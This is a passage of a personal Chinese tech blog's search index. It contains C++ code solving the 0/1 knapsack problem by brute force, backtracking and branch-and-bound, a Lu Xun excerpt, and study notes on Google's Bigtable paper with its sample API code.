\u0026lt; set_number; i++) { max_set[i] = current_set[i]; } } } else { for (int j = 1; j \u0026gt;= 0; j--) { current_set[layer] = j; current_weight += (goods[layer].weight * current_set[layer]); current_value += (goods[layer].value * current_set[layer]); // 继续进行子树的递归 brute_force(layer + 1, current_value, current_weight); // 递归出来后回滚数据 current_weight -= (goods[layer].weight * current_set[layer]); current_value -= (goods[layer].value * current_set[layer]); } } } public: Bag(int N) { maxValue = 0;\t// 最大价值初始化为0 set_number = N;\t// 初始化元素个数 initialize_set(N);\t// 初始化集合 print_wv(N);\t// 打印信息 } // 求解最大价值 void get_maxValue(int layer, int cv, int cw) { // 蛮力法求解 t1 = getSystemTime();\t// 开始计时 brute_force(layer, cv, cw); t2 = getSystemTime();\t// 结束计时 //打印时间 sum_time = t2 - t1; cout \u0026lt;\u0026lt; \u0026#34;蛮力法求解规模为 \u0026#34; \u0026lt;\u0026lt; set_number \u0026lt;\u0026lt; \u0026#34; 的0/1背包所需要的时间为：\u0026#34; \u0026lt;\u0026lt; sum_time \u0026lt;\u0026lt; \u0026#34;ms.\u0026#34; \u0026lt;\u0026lt; endl; // 打印结果 print_set(); } // 根据货物单位价值进行排序 void sort_set() {\t// 计算权值 for (int i = 0; i \u0026lt; set_number; i++) { goods[i].ave_value = double(goods[i].value) / double(goods[i].weight); } // 根据权值排序 sort(goods, goods + sizeof(goods) / sizeof(GD), sort_rule()); // 打印根据权值排序后的内容 cout \u0026lt;\u0026lt; \u0026#34;根据单位价值排序后的物品重量以及对应的价值为：\u0026#34; \u0026lt;\u0026lt; endl \u0026lt;\u0026lt; \u0026#34;weight -\u0026gt; { \u0026#34;; for (int i = 0; i \u0026lt; set_number; i++) { cout \u0026lt;\u0026lt; goods[i].weight \u0026lt;\u0026lt; \u0026#34; \u0026#34;; } cout \u0026lt;\u0026lt; \u0026#34;}\u0026#34; \u0026lt;\u0026lt; endl \u0026lt;\u0026lt; \u0026#34;value -\u0026gt; { \u0026#34;; for (int i = 0; i \u0026lt; set_number; i++) { cout \u0026lt;\u0026lt; goods[i].value \u0026lt;\u0026lt; \u0026#34; \u0026#34;; } cout \u0026lt;\u0026lt; \u0026#34;}\u0026#34; \u0026lt;\u0026lt; endl; } };\t// 蛮力法，作为基类 class Bag_with_backtrack : public Bag {\t// 继承 Bag 的保护以及公用成员 protected: int current_set[MAX] = { 0 };\t// define current_set to save current set int Bound_sv(int layer, int cv) { int i = layer; int sv = cv; for (i; i \u0026lt; set_number; i++) { sv += goods[i].value;\t// 剩余物品都装下时的最大价值 } return sv; } double Bound(int layer,int cv,int cw){ int i = layer; double sv = double(cv); int cr = capacity - cw; while (i\u0026lt;set_number \u0026amp;\u0026amp; goods[i].weight \u0026lt;= cr) { cr -= goods[i].weight; sv = sv + goods[i].value; i++; } if (i \u0026lt; set_number) sv = sv + goods[i].ave_value * cr; return sv; } // Using back track method to get max value void BackTrack(int layer, int current_value, int current_weight) { // layer代表回溯层数，其余参数分别代表当前价值以及当前重量 //double expect_sumValue = 0;\t// 记录期望价值总和 if (layer == set_number) {\t// if layer bigger than number, over // 注意这个地方，不用大于 ！！！ if (current_value \u0026gt; maxValue) { maxValue = current_value; for (int i = 0; i \u0026lt; set_number; i++) { max_set[i] = current_set[i]; } } } else { for (int j = 0; j \u0026lt;= 1; j++) { current_set[layer] = j; /************************剪枝**************************/ if ( current_weight + current_set[layer] * goods[layer].weight \u0026lt;= capacity \u0026amp;\u0026amp; Bound_sv(layer,current_value) \u0026gt;= maxValue \u0026amp;\u0026amp; Bound(layer,current_value,current_weight) \u0026gt; maxValue ) { // 更新当前背包物品的总重量，目前背包物品的总价值 current_weight += (goods[layer].weight * current_set[layer]); current_value += (goods[layer].value * current_set[layer]); // 继续进行子树的递归 BackTrack(layer + 1, current_value, current_weight); // 递归出来后回滚数据 current_weight -= (goods[layer].weight * current_set[layer]); current_value -= (goods[layer].value * current_set[layer]); } } } } public: Bag_with_backtrack(int N) :Bag(N) { cout \u0026lt;\u0026lt; \u0026#34;回溯法对象实例化...\u0026#34; \u0026lt;\u0026lt; endl; } void get_maxValue_by_backTrack(int layer, int current_value, int current_weight) { // 按照单位价值进行排序 t1 = getSystemTime(); // 开始计时 sort_set(); // 使用回溯法进行求解 BackTrack(layer, current_value, current_weight); t2 = getSystemTime();\t// 结束计时 // 打印时间 sum_time = t2 - t1; cout \u0026lt;\u0026lt; \u0026#34;回溯法求解规模为 \u0026#34; \u0026lt;\u0026lt; set_number \u0026lt;\u0026lt; \u0026#34; 的0/1背包问题所需要的时间为：\u0026#34; \u0026lt;\u0026lt; sum_time \u0026lt;\u0026lt; \u0026#34;ms.\u0026#34; \u0026lt;\u0026lt; endl; // 打印集合 print_set(); } };\t// 回溯法，继承基类Bag class Bag_with_branchAndbound :public Bag {\t// 从 Bag 类中派生 protected: int tree_node_id = 1;\t// 解空间树结点id 1开始 int lower_bound = 0;\t// 目标函数的下界 // 贪心法求背包容量的下界 int greed() { int temp[MAX] = { 0 };\t// 定义临时数组，用来表示货物向量，并初始化为0 int cap = capacity;\t// 暂存背包容量 int w = 0;\t// 当前背包容量 int updown = 0;\t// 下界 // 对背包物品按照单位价值进行排序 sort_set(); // 求解 for (int i = 0; i \u0026lt; set_number; i++) { // 如果超重，跳出 if ((w+goods[i].weight) \u0026gt; cap) { continue; } temp[i] = 1; w += goods[i].weight; updown += (temp[i] * goods[i].value); } cout \u0026lt;\u0026lt; \u0026#34;解的下界是：\u0026#34; \u0026lt;\u0026lt; updown \u0026lt;\u0026lt; endl; return updown; } // 限界函数求上界 void limit(ND \u0026amp;n)\t//计算分枝结点的上界 { // 下一个要选的物品就是第layer层物品 int w = n.current_weight; double v = n.current_value; int i = n.layer; while (i \u0026lt; set_number \u0026amp;\u0026amp; w + goods[i].weight \u0026lt;= capacity) { w += goods[i].weight; v += goods[i].value; i++; } if (i \u0026lt; set_number) { // 装部分物品 n.ub = v + (capacity - w)*goods[i].ave_value; } else { n.ub = v; } } // 优先队列进队操作 void EnQueue(ND n, priority_queue\u0026lt;ND\u0026gt; \u0026amp;q) { if (n.layer == set_number) {\t// 已经到达叶子结点 if (n.current_value \u0026gt; maxValue) {\t// 更新maxValue maxValue = n.current_value; for (int i = 0; i \u0026lt; set_number; i++) { max_set[i] = n.cset[i]; } } } else { q.push(n);\t// 非叶子结点进队 } } // 分支限界法 void branchAndbound() { // 首先使用贪心法求解此goods集合的目标值下界 lower_bound = greed(); priority_queue\u0026lt;ND\u0026gt; q;\t// 优先队列 ND n0, n1, n2;\t// 先定义根结点，左孩子结点，右孩子结点 /*初始化根节点*/ n0.id = tree_node_id++;\tn0.layer = 0; n0.current_value = 0; n0.current_weight = 0; for (int i = 0; i \u0026lt; set_number; i++) { n0.cset[i] = 0; } limit(n0);\t// 求根结点上界 q.push(n0);\t// 根结点进队 while (!q.empty())\t// 队不空循环 { n0 = q.top();\t// 取队头 q.pop();\t// 出队 if (n0.current_weight + goods[n0.layer].weight \u0026lt;= capacity \u0026amp;\u0026amp; n0.ub \u0026gt;= lower_bound) {\t// 超重剪枝 小于最小期望重量剪枝 // 设置左孩子结点 n1.id = tree_node_id++; n1.layer = n0.layer + 1; n1.current_weight = n0.current_weight + goods[n0.layer].weight; n1.current_value = n0.current_value + goods[n0.layer].value; /*复制解向量*/ for (int i = 0; i \u0026lt; set_number; i++) { n1.cset[i] = n0.cset[i]; } n1.cset[n1.layer-1] = 1;\t// 更新解向量 limit(n1);\t// 求限界函数上界 EnQueue(n1, q);\t// 左孩子进队 } // 设置右孩子结点 n2.id = tree_node_id++; n2.layer = n0.layer + 1; n2.current_value = n0.current_value; n2.current_weight = n0.current_weight; // 复制解向量 for (int i = 0; i \u0026lt; set_number; i++) { n2.cset[i] = n0.cset[i]; } n2.cset[n2.layer-1] = 0;\t// 更新解向量 limit(n2);\t// 求界限函数上界 if (n2.ub \u0026gt; maxValue \u0026amp;\u0026amp; n2.ub \u0026gt;= lower_bound) {\t// 剪枝，期望最大值小于已有最大值就剪枝 小于最小期望重量剪枝 EnQueue(n2, q); } } } public: Bag_with_branchAndbound(int N) :Bag(N) { cout \u0026lt;\u0026lt; \u0026#34;分支限界法对象实例化...\u0026#34; \u0026lt;\u0026lt; endl; } void get_maxValue_by_branchAndbound() { // 分支限界法 t1 = getSystemTime();\t// 开始计时 branchAndbound(); t2 = getSystemTime();\t// 结束计时 // 计算并打印时间 sum_time = t2 - t1; cout \u0026lt;\u0026lt; \u0026#34;使用分支限界法求解问题规模为\u0026#34; \u0026lt;\u0026lt; set_number \u0026lt;\u0026lt; \u0026#34; 的0/1背包问题所需要的时间为：\u0026#34; \u0026lt;\u0026lt; sum_time \u0026lt;\u0026lt; \u0026#34;ms.\u0026#34; \u0026lt;\u0026lt; endl; // 打印集合 print_set(); } };\t// int main() { srand((unsigned)time(NULL)); /*************蛮力法************/ //for (int i = 0; i \u0026lt; 40; i++) { //\tBag bag = Bag(i); //\tbag.get_maxValue(0, 0, 0); //} /************回溯法*************/ //int n = 1; //for (int i = 512; i \u0026lt; 2000; i+=100) { //\tn *= 2; //Bag_with_backtrack bag = Bag_with_backtrack(4); //bag.get_maxValue_by_backTrack(0, 0, 0); //} /************分支限界法*************/ //Bag_with_branchAndbound bag = Bag_with_branchAndbound(5); //bag.get_maxValue_by_branchAndbound(); //for (int n = 1; n \u0026lt;= 5000; n*=2) { Bag_with_branchAndbound bag = Bag_with_branchAndbound(4); bag.get_maxValue_by_branchAndbound(); //} return 0; } ","date":"2019-11-21T14:34:04+08:00","permalink":"https://lizonglingo.github.io/p/%E7%94%A8%E4%B8%8D%E5%90%8C%E7%AE%97%E6%B3%95%E8%A7%A3%E5%86%B30/1%E8%83%8C%E5%8C%85%E9%97%AE%E9%A2%98/","title":"用不同算法解决0/1背包问题"},{"content":" 所以我时常害怕，愿中国青年都摆脱冷气，只是向上走，不必听自暴自弃者流的话。能做事的做事，能发声的发声。有一分热，发一分光，就令萤火一般，也可以在黑暗里发一点光，不必等候炬火。 此后如竟没有炬火：我便是唯一的光。倘若有了炬火，出了太阳，我们自然心悦诚服的消失，不但毫无不平，而且还要随喜赞美这炬火或太阳；因为他照了人类，连我都在内。 我又愿中国青年都只是向上走，不必理会这冷笑和暗箭。 尼采说： “真的，人是一个浊流。应该是海了，能容这浊流使他干净。 “咄，我教你们超人：这便是海，在他这里，能容下你们的大侮蔑。”（《札拉图如是说》的《序言》第三节）\n纵令不过一洼浅水，也可以学学大海；横竖都是水，可以相通。几粒石子，任他们暗地里掷来；几滴秽水，任他们从背后泼来就是了。 这还算不到“大侮蔑”——因为大侮蔑也须有胆力。 \u0026mdash;- 鲁迅《热风》\n","date":"2019-10-11T22:40:02+08:00","permalink":"https://lizonglingo.github.io/p/%E7%83%AD%E9%A3%8E%E8%8A%82%E9%80%89/","title":"《热风》节选"},{"content":"Google Bigtable Google Bigtable论文要点整理\n摘要 本质及用途 分布式的结构化数据存储系统 被设计用来处理海量数据（通常是分布在数千台普通服务器上的 PB 级的数据） 应用 Web索引 Google Earth Google Finanace 本文所做的 本论文描述了 Bigtable 提供的简单的数据模型。利用这个模型，用户可以动态的控制数据的分布和格式。 我们还将描述 Bigtable 的设计和实现。\n介绍 Bigtable的目标 适用性广泛 可扩展 高性能 高可用性 与传统数据库的异同 相同点：\n使用很多数据库的实现策略 不同点：\nBigtable 不支持完整的关系数据模型 Bigtable 为客户提供了简单的数据模型，利用这个模型，客户可以动态控制数据的分布和格式，用户也可以自己推测底层存储数据的位置相关性 数据 数据的下标是行和列的名字 名字可以是任意字符串 存储的数据均视为字符串 Bigtable本身不会去解析 客户存入结构化或半结构化数据，通过选择数据模式，用户可以控制数据位置的相关性 通过参数调节存放位置：内存 | 硬盘 数据模型 Bigtable 是一个稀疏的、分布式的、持久化存储的多维度排序 Map。Map 的索引是行关键字、列关键字 以及时间戳；Map 中的每个 value 都是一个未经解析的 byte 数组。\n(row:string, column:string,time:int64)-\u0026gt;string Webtable\n行关键字：URL 列名：网页的某些属性 contents列：存储网页的某些属性 标识：网页的时间戳 行名：反向URL contents列族：网页的内容 anchor列族：引用该网页的锚链接文本 行 行关键字：\n任意字符串（最大支持64KB） 同一行关键字读写操作都为原子操作 Tablet\nBigtable通过行关键字字典顺序组织数据 表中每行可以动态分区，每个分区叫Tablet，是数据分布和负载均衡调整的最小单位 列族 列关键字组成的集合叫做“列族“，是访问控制的基本单位 同一列族下的所有数据通常都属于同一个类型 列族在使用之前必须先创建，然后才能在列族中任何的列关键字下存放数据 创建后，其中的任何一个列关键字下都可以存放数据 一张表中列族不能太多（最多几百个） 但是一张表中可以有无限多个列 列关键字命名 语法：\n列族：限定词 列组名字：可打印字符串\n限定词：任意的字符串\n比如，Webtable 有个列族 language，language 列族用来存放撰写网页的语言。我们在 language列族中只使用一个列关键字，用来存放每个网页的语言标识 ID。Webtable 中另一个有用的列族是 anchor；这个列族的每一个列关键字代表一个锚链接，如图一所示。Anchor 列族的限定词是引用该网页的站点名；Anchor列族每列的数据项存放的是链接文本。\n控制权限 访问控制、磁盘和内存的使用统计都是在列族层面进行 在我们的 Webtable 的例子中，上述的控制权限能帮助我们管理不同类型的应用：\n允许一些应用可以添加新的基本数据 一些应用可以读取基本数据并创建继承的列族 一些应用则只允许浏览数据（甚至可能因为隐私的原因不能浏览所有数据） 时间戳 在 Bigtable 中，表的每一个数据项都可以包含同一份数据的不同版本；不同版本的数据通过时间戳来索引。\n时间戳：\n64位整型 Bigtable可以给时间戳赋值，精确到ms 用户可以给时间戳赋值 不同版本数据按照时间戳倒序排序，最新的数据在最前面 垃圾回收：\n为了减轻多个版本数据的管理负担，我们对每一个列族配有两个设置参数，Bigtable 通过这两个参数可以对废弃版本的数据自动进行垃圾收集。用户可以指定只保存最后 n 个版本的数据，或者只保存“足够新”的版本的数据（比如，只保存最近 7 天的内容写入的数据）。 、\nAPI Bigtable提供的API 建立和删除表以及列族的API函数 修改集群、表和列族的元数据的API 例如修改访问权限：\n// Open the table Table *T = OpenOrDie(“/bigtable/web/webtable”); // Write a new anchor and delete an old anchor RowMutation r1(T, “com.cnn.www”); r1.Set(“anchor:www.c-span.org”, “CNN”); r1.Delete(“anchor:www.abc.com”); Operation op; Apply(\u0026amp;op, \u0026amp;r1); /* *客户程序可以对 Bigtable 进行如下的操作：写入或者删除 Bigtable 中的值、从每个行中查找值、或者遍历表中 *的一个数据子集。图 2 中的Ｃ++代码使用 RowMutation 抽象对象进行了一系列的更新操作。（为了保持示例代码的 *简洁，我们忽略了一些细节相关代码）。调用 Apply 函数对Ｗebtable 进行了一个原子修改操作：它为 *www.cnn.com 增加了一个锚点，同时删除了另外一个锚点。 */ Scanner scanner(T); ScanStream *stream; stream = scanner.FetchColumnFamily(“anchor”); stream-\u0026gt;SetReturnAllVersions(); scanner.Lookup(“com.cnn.www”); for (; !stream-\u0026gt;Done(); stream-\u0026gt;Next()) { printf(“%s %s %lld %s\\n”, scanner.RowName(), stream-\u0026gt;ColumnName(), stream-\u0026gt;MicroTimestamp(), stream-\u0026gt;Value()); } /* *C++代码使用 Scanner 抽象对象遍历一个行内的所有锚点。客户程序可以遍历多个列族，有几种方法可以对扫描输出 *的行、列和时间戳进行限制。例如，我们可以限制上面的扫描，让它只输出那些匹配正则表达式*.cnn.com 的锚点， *或者那些时间戳在当前时间前 10 天的锚点 */ 支持的其他特性 Bigtable 支持单行上的事务处理：利用这个功能，用户可以对存储在一个行关键字下的数据进行原子性的读-更新-写操作 Bigtable 允许把数据项用做整数计数器 Bigtable 允许用户在服务器的地址空间内执行脚本程序 Bigtable 可以和 MapReduce 一起使用，MapReduce 是 Google 开发的大规模并行计算框架。我们已经开发了一些 Wrapper 类，通过使用这些 Wrapper 类，Bigtable 可以作为 MapReduce 框架的输入和输出。\nBigTable构建 GFS BigTable 使用 Google 的分布式文件系统(GFS)存储日志文件和数据文件 集群 BigTable 集群通常运行在一个共享的机器池中，池中的机器还会运行其它的各种各样的分布式应用程序，BigTable 的进程经常要和其它应用的进程共享机器 BigTable 依赖集群管理系统来调度任务、管理共享的机器上的资源、处理机器的故障、以及监视机器的状态 Google SSTable BigTable 内部存储数据的文件是 Google SSTable 格式的 SSTable 是一个持久化的、排序的、不可更改的Map 结构，而 Map 是一个 key-value 映射的数据结构，key 和 value 的值都是任意的 Byte 串。可以对 SSTable进行如下的操作：查询与一个 key 值相关的 value，或者遍历某个 key 值范围内的所有的 key-value 对。从内部看，SSTable 是一系列的数据块（通常每个块的大小是 64KB，这个大小是可以配置的）。SSTable 使用块索引（通常存储在 SSTable 的最后）来定位数据块；在打开 SSTable 的时候，索引被加载到内存。每次查找都可以通过一次磁盘搜索完成：首先使用二分查找法在内存中的索引里找到数据块的位置，然后再从硬盘读取相应的数据块。也可以选择把整个 SSTable 都放在内存中，这样就不必访问硬盘了。\nChubby BigTable 还依赖一个高可用的、序列化的分布式锁服务组件，叫做 Chubby 一个 Chubby 服务包括了 5 个活动的副本，其中的一个副本被选为 Master，并且处理请求。只有在大多数副本都是正常运行的，并且彼此之间能够互相通信的情况下，Chubby 服务才是可用的。当有副本失效的时候，Chubby 使用 Paxos 算法来保证副本的一致性。Chubby 提供了一个名字空间，里面包括了目录和小文件。每个目录或者文件可以当成一个锁，读写文件的操作都是原子的。Chubby 客户程序库提供对 Chubby 文件的一致性缓存。每个 Chubby 客户程序都维护一个与 Chubby 服务的会话。如果客户程序不能在租约到期的时间内重新签订会话的租约，这个会话就过期失效了9。当一个会话失效时，它拥有的锁和打开的文件句柄都失效了。Chubby 客户程序可以在文件和目录上注册回调函数，当文件或目录改变、或者会话过期时，回调函数会通知客户程序。\nBigtable 使用 Chubby 完成以下的几个任务：\n确保在任何给定的时间内最多只有一个活动的 Master 副本； 存储 BigTable 数据的自引导指令的位置（参考 5.1 节）； 查找 Tablet 服务器，以及在 Tablet 服务器失效时进行善后（5.2 节）； 存储 BigTable 的模式信息（每张表的列族信息）； 以及存储访问控制列表。 如果Chubby长时间无法访问，BigTable就会失效。\n介绍 Bigtable包括了主要的三个组件：\n链接到客户程序中的库 一个Master服务器 多个Tablet服务器 根据系统工作负载的变化，BigTable动态的向集群中添加（或删除）Tablet服务器。\nMaster服务器 Master服务器主要负责以下工作：\n为 Tablet 服务器分配 Tablets 检测新加入的或者过期失效的 Table 服务器 对 Tablet 服务器进行负载均衡 对保存在 GFS 上的文件进行垃圾收集 处理对模式的相关修改操作，例如建立表和列族 Tablet服务器 每个 Tablet 服务器都管理一个 Tablet 的集合（通常每个服务器有大约数十个至上千个 Tablet）。每个 Tablet服务器负责处理它所加载的 Tablet 的读写操作，以及在 Tablets 过大时，对其进行分割。\n和很多 Single-Master 类型的分布式存储系统【17.21】类似，客户端读取的数据都不经过 Master 服务器：客户程序直接和 Tablet 服务器通信进行读写操作。由于 BigTable 的客户程序不必通过 Master 服务器来获取 Tablet 的位置信息，因此，大多数客户程序甚至完全不需要和 Master 服务器通信。在实际应用中，Master服务器的负载是很轻的。 一个 BigTable 集群存储了很多表，每个表包含了一个 Tablet 的集合，而每个 Tablet 包含了某个范围内的行的所有相关数据。初始状态下，一个表只有一个 Tablet。随着表中数据的增长，它被自动分割成多个Tablet，缺省情况下，每个 Tablet 的尺寸大约是 100MB 到 200MB。\nTablet的位置 我们使用一个三层的、类似Ｂ+树[10]的结构存储 Tablet 的位置信息。\n第一层是一个存储在 Chubby 中的文件，包含 Root Tablet 的位置信息。 Root Tablet 包含一个特殊的 METADATA 表里所有的 Tablet 的位置信息。 METADATA 表的每个 Tablet 包含了一个用户 Tablet 的集合。 Root Tablet 是 METADATA 表的第一个 Tablet，对它的处理比较特殊 ，Root Tablet 永远不会被分割 ，这就保证了 Tablet 的位置信息存储结构不会超过三层。 METADATA 表中每个 Tablet 的位置信息都存放在一个行关键字下面，而这个行关键字是由 Tablet所在的表的标识符和 Tablet 的最后一行编码而成的。 METADATA 的每一行都存储了大约 1KB 的内存数据。 在一个大小适中的、容量限制为 128MB 的 METADATA Tablet 中，采用这种三层结构的存储模式，可以标识 2^34 个 Tablet 的地址（如果每个 Tablet 存储 128MB 数据，那么一共可以存储 2^61 字节数据）。 客户程序使用的库会缓存 Tablet 的位置信息。如果客户程序没有缓存某个 Tablet 的地址信息，或者发现它缓存的地址信息不正确，客户程序就在树状的存储结构中递归的查询 Tablet 位置信息；如果客户端缓存是的，那么寻址算法需要通过三次网络来回通信寻址，这其中包括了一次 Chubby 读操作；如果客户端缓存的地址信息过期了，那么寻址算法可能需要最多６次网络来回通信才能更新数据，因为只有在缓存中没有查到数据的时候才能发现数据过期。\n尽管 Tablet 的地址信息是存放在内存里的，对它的操作不必访问 GFS 文件系统，但是，通常我们会通过预取 Tablet 地址来进一步的减少访问的开销：每次需要从 METADATA 表中读取一个 Tablet 的元数据的时候，它都会多读取几个 Tablet 的元数据。\n在 METADATA 表中还存储了次级信息，包括每个 Tablet 的事件日志（例如，什么时候一个服务器开始为该 Tablet 提供服务）。这些信息有助于排查错误和性能分析。\nTablet分配 在任何一个时刻，一个Tablet只能分配给一个Tablet服务器。 Master服务器记录了：\n当前有哪些活跃的Tablet服务器 哪些 Tablet 分配给了哪些 Tablet 服务器 哪些 Tablet 还没有被分配 当一个 Tablet 还没有被分配、并且刚好有一个 Tablet 服务器有足够的空闲空间装载该 Tablet 时，Master 服务器会给这个 Tablet 服务器发送一个装载请求，把 Tablet 分配给这个服务器。\nBigTable 使用 Chubby 跟踪记录 Tablet 服务器的状态。 当一个 Tablet 服务器启动，它在 Chubby 的一个指定目录下建立一个有唯一性名字的文件，获取该文件的独占锁 Master 服务器实时监控着这个目录（服务器目录），因此 Master 服务器能够知道有新的 Tablet 服务器加入了 如果 Tablet 服务器丢失了 Chubby 上的独占锁，比如由于网络断开导致 Tablet 服务器和 Chubby 的会话丢失，它就停止对 Tablet 提供服务 只要文件还存在，Tablet 服务器就会试图重新获得对该文件的独占锁；如果文件不存在了，那么Tablet 服务器就不能再提供服务了，它会自行退出 当 Tablet 服务器终止时（比如，集群的管理系统将运行该 Tablet 服务器的主机从集群中移除），它会尝试释放它持有的文件锁，这样一来，Master 服务器就能尽快把Tablet 分配到其它的 Tablet 服务器 Master 服务器负责检查一个 Tablet 服务器是否已经不再为它的 Tablet 提供服务了，并且要尽快重新分配 它加载的 Tablet。 Master 服务器通过轮询 Tablet 服务器文件锁的状态来检测何时 Tablet 服务器不再为 Tablet提供服务。 如果一个 Tablet 服务器报告它丢失了文件锁，或者 Master 服务器最近几次尝试和它通信都没有得到响应，Master 服务器就会尝试获取该 Tablet 服务器文件的独占锁；如果 Master 服务器成功获取了独占锁，那么就说明 Chubby 是正常运行的，而 Tablet 服务器要么是宕机了、要么是不能和 Chubby 通信了，因此，Master 服务器就删除该 Tablet 服务器在 Chubby 上的服务器文件以确保它不再给 Tablet 提供服务。一旦 Tablet 服务器在 Chubby 上的服务器文件被删除了，Master 服务器就把之前分配给它的所有的 Tablet 放入未分配的 Tablet集合中。 为了确保 Bigtable 集群在 Master 服务器和 Chubby 之间网络出现故障的时候仍然可以使用，Master服务器在它的 Chubby 会话过期后主动退出。但是不管怎样，如同我们前面所描述的，Master 服务器的故障不会改变现有 Tablet 在 Tablet 服务器上的分配状态。 当集群管理系统启动了一个 Master 服务器之后，Master 服务器首先要了解当前 Tablet 的分配状态，之后才能够修改分配状态。Master 服务器在启动的时候执行以下步骤：\nMaster 服务器从 Chubby 获取一个唯一的 Master 锁，用来阻止创建其它的 Master 服务器实例； Master 服务器扫描 Chubby 的服务器文件锁存储目录，获取当前正在运行的服务器列表； Master 服务器和所有的正在运行的 Tablet 表服务器通信，获取每个 Tablet 服务器上 Tablet 的分配信息； Master 服务器扫描 METADATA 表获取所有的 Tablet 的集合。 在扫描的过程中，当 Master 服务器发现了一个还没有分配的 Tablet，Master 服务器就将这个 Tablet 加入未分配的 Tablet 集合等待合适的时机分配。\nTablet服务 Tablet 的持久化状态信息保存在 GFS 上 更新操作提交到 REDO 日志中 MEMTABLE 和 SSTABLE Tablet 的持久化状态信息保存在 GFS 上。更新操作提交到 REDO 日志中。\n在这些更新操作中，最近提交的那些存放在一个排序的缓存中，我们称这个缓存为 memtable；较早的更新存放在一系列SSTable 中。\n为了恢复一个 Tablet，Tablet 服务器首先从 METADATA 表中读取它的元数据。\nTablet 的元数据包含了组成这个 Tablet 的SSTable 的列表，以及一系列的 Redo Point，这些 Redo Point 指向可能含有该 Tablet数据的已提交的日志记录。Tablet 服务器把 SSTable 的索引读进内存，之后通过重复 Redo Point 之后提交的更新来重建 memtable。\n当对 Tablet 服务器进行写操作时，Tablet 服务器首先要检查这个操作格式是否正确、操作发起者是否有执行这个操作的权限。一个有效的读操作在一个由一系列 SSTable 和 memtable 合并的视图里执行。由于 SSTable 和 memtable 是按字典排序的数据结构，因此可以高效生成合并视图。\n另外，当进行 Tablet 的合并和分割时，正在进行的读写操作能够继续进行。\n空间收缩 随着写操作的执行，memtable 的大小不断增加。当 memtable 的尺寸到达一个门限值的时候，这个 memtable就会被冻结，然后创建一个新的 memtable 被冻结住 memtable 会被转换成 SSTable，然后写入 GFS 目的 shrink Tablet 服务器使用的内存，以及在服务器灾难恢复过程中，减少必须从提交日志里读取的数据量。\n流程 每一次 Minor Compaction 都会创建一个新的 SSTable。 如果 Minor Compaction 过程不停滞的持续进行下去，读操作可能需要合并来自多个 SSTable 的更新；否则，我们通过定期在后台执行 Merging Compaction 过程合并文件，限制这类文件的数量。 Merging Compaction 过程读取一些 SSTable 和 memtable 的内容，合并成一个新的 SSTable。只要Merging Compaction 过程完成了，输入的这些 SSTable 和 memtable 就可以删除了。 合并所有的 SSTable 并生成一个新的 SSTable 的 Merging Compaction 过程叫作 Major Compaction。由非 Major Compaction 产生的 SSTable 可能含有特殊的删除条目，这些删除条目能够隐藏在旧的、但是依然有效的SSTable中已经删除的数据。 Major Compaction过程生成的SSTable不包含已经删除的信息或数据。 Bigtable循环扫描它所有的 Tablet，并且定期对它们执行 Major Compaction。Major Compaction 机制允许 Bigtable 回收已经删除的数据占有的资源，并且确保 BigTable 能及时清除已经删除的数据。 优化 局部性群组 特性 多个列族组合成一个局部性群组\nTablet中每个局部性群组都会生成一个单独的SSTable\n通常将不会一起访问的列族分割成不同的局部性群组可以提高读取效率\n例如，在 Webtable表中，网页的元数据（比如语言和 Checksum）可以在一个局部性群组中，网页的内容可以在另外一个群组：当一个应用程序要读取网页的元数据的时候，它没有必要去读取所有的页面内容。\n可以以局部性群组为单位设定一些有用的调试参数\n比如，可以把一个局部性群组设定为全部存储在内存中。Tablet 服务器依照惰性加载的策略将设定为放入内存的局部性群组的 SSTable 装载进内存。加载完成之后，访问属于该局部性群组的列族的时候就不必读取硬盘了。这个特性对于需要频繁访问的小块数据特别有用：在 Bigtable 内部，我们利用这个特性提高 METADATA 表中具有位置相关性的列族的访问速度。\n压缩 两遍压缩 第一遍采用 Bentley and McIlroy’s 方式，这种方式在一个很大的扫描窗口里对常见的长字符串进行压缩。\n第二遍是采用快速压缩算法，即在一个 16KB 的小扫描窗口中寻找重复数据。\n通过缓存提高读操作性能 二级缓存\n目的：为例提高读操作的性能 流程： 扫描缓存是第一级缓存，主要缓存 Tablet服务器通过 SSTable 接口获取的 Key-Value 对（对于经常要重复读取相同数据的应用程序来说，扫描缓存非常有效） Block 缓存是二级缓存，缓存的是从 GFS 读取的 SSTable 的 Block（对于经常要读取刚刚读过的数据附近的数据的应用程序来说，Block 缓存更有用） Bloom过滤器 一个读操作必须读取构成 Tablet 状态的所有 SSTable 的数据。如果这些 SSTable 不在内存中，那么就需要多次访问硬盘。我们通过允许客户程序对特定局部性群组的 SSTable 指定 Bloom 过滤器来__减少硬盘访问的次数__。\nCommit日志的实现 如果我们把对每个 Tablet 的操作的 Commit 日志都存在一个单独的文件的话，那么就会产生大量的文件，并且这些文件会并行的写入 GFS。根据 GFS 服务器底层文件系统实现的方案，要把这些文件写入不同的磁盘日志文件时，会有大量的磁盘 Seek 操作。另外，由于批量提交25中操作的数目一般比较少，因此，对每个Tablet 设置单独的日志文件也会给批量提交本应具有的优化效果带来很大的负面影响。\n为了避免这些问题，我们__设置每个 Tablet 服务器一个 Commit 日志文件，把修改操作的日志以追加方式写入同一个日志文件__，因此__一个实际的日志文件中混合了对多个 Tablet 修改的日志记录__。\n使用单个日志显著提高了普通操作的性能，但是将恢复的工作复杂化了。\n为了避免多次读取日志文件：\n把日志按照关键字（table，row name，log sequence number）排序； 排序之后，对同一个 Tablet 的修改操作的日志记录就连续存放在了一起。 因此，我们只要一次磁盘 Seek 操作， 之后顺序读取就可以。\nTablet恢复提速 Master 服务器将一个 Tablet 从一个 Tablet 服务器移到另外一个 Tablet 服务器时，源 Tablet 服务器会对这个 Tablet 做一次 Minor Compaction； 这个 Compaction 操作减少了 Tablet 服务器的日志文件中没有归并的记录，从而减少了恢复的时间。 Compaction 完成之后，该服务器就停止为该 Tablet 提供服务； 在卸载 Tablet 之前，源 Tablet 服务器还会再做一次（通常会很快）Minor Compaction，以消除前面在一次压缩过程中又产生的未归并的记录； 第二次 Minor Compaction 完成以后，Tablet 就可以被装载到新的 Tablet 服务器上了，并且不需要从日志中进行恢复。 利用不变性 在使用 Bigtable 时，除了 SSTable 缓存之外的其它部分产生的 SSTable 都是不变的，我们可以利用这一点对系统进行简化：例如，当从 SSTable 读取数据的时候，我们不必对文件系统访问操作进行同步，这样一来，就可以非常高效的实现对行的并行操作； memtable 是唯一一个能被读和写操作同时访问的可变数据结构； 对内存表采用 COW(Copy-on-write)机制，这样就允许读写操作并行执行； 可以把永久删除被标记为“删除”的数据的问题，转换成对废弃的SSTable 进行垃圾收集的问题； 每个 Tablet 的 SSTable 都在 METADATA 表中注册了Master 